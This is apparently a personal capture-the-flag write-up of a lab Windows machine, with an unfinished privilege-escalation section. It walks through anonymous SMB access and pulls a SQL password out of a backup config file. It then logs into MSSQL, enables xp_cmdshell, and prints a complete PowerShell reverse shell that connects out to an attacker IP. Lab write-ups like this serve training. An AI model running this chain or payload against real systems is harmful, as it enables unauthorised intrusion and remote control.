HaK dE BaUKs: 
===========================



### Recon 

### Scanning and Enumeration
`nmap -sC -sV -vv -O -oA nmap/initial-scan 10.10.10.27`
open ports of interest:
445: SMB
1433: SQL

### Foothold

upon checking out the smb server using `smbclient -N -L 10.10.10.27`, i found that there is a backup share, which sounds juicy, so gonna see if i can get anonymous access
 
turns out I could indeed access anonymously. First, I logged in: `smbclient -N \\\\10.10.10.27\\backups`, then I listed the directory using `dir`. Finally, upon seeing a config file, i scooped it using `get prod.dtsConfig`

Contents of the config:
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>

the interesteing here is that we actually found a sql connection string with credentials for the local user ARCHETYPE/sql_svc

To connect, I used Impacket's mssqlclient:
`mssqlclient ARCHETYPE\sql_svc@10.10.10.27 -windows-auth`

and passed in the password:
M3g4c0rp123

After getting into the sql server, the first thing to do is check if this user has sysadmin priviledges by executing `SELECT IS_SRVROLEMEMBER ('sysadmin')`, which returns '1' so ill assume that means true

From here, its just a matter of enalig xp_cmdshell to get rce:

```
EXEC sp_configure 'Show Advanced Options', 1;
reconfigure;
sp_configure;
EXEC sp_configure 'xp_cmdshell', 1
reconfigure;
xp_cmdshell "whoami"
```
with whoami, we see that the sql server is running in the context of ARCHETYPE\sql_svc, but this account doesnt have admin on the host, so lets try to get a rev shell and then worry about escalating priviledges.

powershell reverse shell:

```
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.3",443);$stream =
$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =
$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName
System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 |
Out-String );$sendback2 = $sendback + "# ";$sendbyte =
([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyt
e.Length);$stream.Flush()};$client.Close()
```

this is put into a file called shell.ps1, and served up on a python web server:
` python3 -m http.server 80`

### Priviledge Escalation

### Covering Tracks 

### Miscellaneous
